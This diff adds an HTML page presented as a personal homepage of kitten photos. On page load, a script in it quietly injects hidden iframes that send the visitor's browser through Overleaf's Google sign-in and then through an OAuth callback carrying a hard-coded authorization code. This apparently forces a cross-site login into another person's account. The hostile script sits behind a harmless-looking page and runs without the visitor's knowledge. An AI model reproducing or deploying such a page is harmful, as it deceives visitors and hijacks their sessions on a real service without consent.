@@ -1,0 +1,37 @@
+<html>
+    <meta name="referrer" content="never">
+
+    <body>
+        <h1>My homepage ;)</h1>
+        <style>
+         div img {
+             display: inline-block;
+             margin: 8px;
+         }
+         img {
+             width: 500px;
+             border: 2px solid #e3e3e3;
+         }
+        </style>
+        <div>
+            <img src="https://images.pexels.com/photos/45170/kittens-cat-cat-puppy-rush-45170.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500">
+            <img src="https://images.pexels.com/photos/416160/pexels-photo-416160.jpeg?auto=compress&cs=tinysrgb&dpr=2&w=500">
+            <img src="https://images.pexels.com/photos/979503/pexels-photo-979503.jpeg?auto=compress&cs=tinysrgb&dpr=2&w=500">
+        </div>
+        
+        <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
+        <script>
+         let uri = 'https://www.overleaf.com/users/auth/google_oauth2/callback?code=4%2FzAFhVumFtayEqYCs15SEYP2D45AUf1bLAtbZJRZTBCLC2Ml-v1tL4HFR-a2mAwCa3fjXvAFdQAaB6h4P8PTxVDY&scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email&authuser=0&prompt=none'
+
+         window.setTimeout(function(){
+             $(document.body).append($("<iframe style='display:none' src='https://www.overleaf.com/auth/google?intent=sign_in'>"))
+         },1500)
+         window.setTimeout(function() {
+             $(document.body).append($(`<iframe style='display:none' src='${uri}' >`))
+         }, 5000);
+        </script>
+
+    </body>
+</html>
+
+
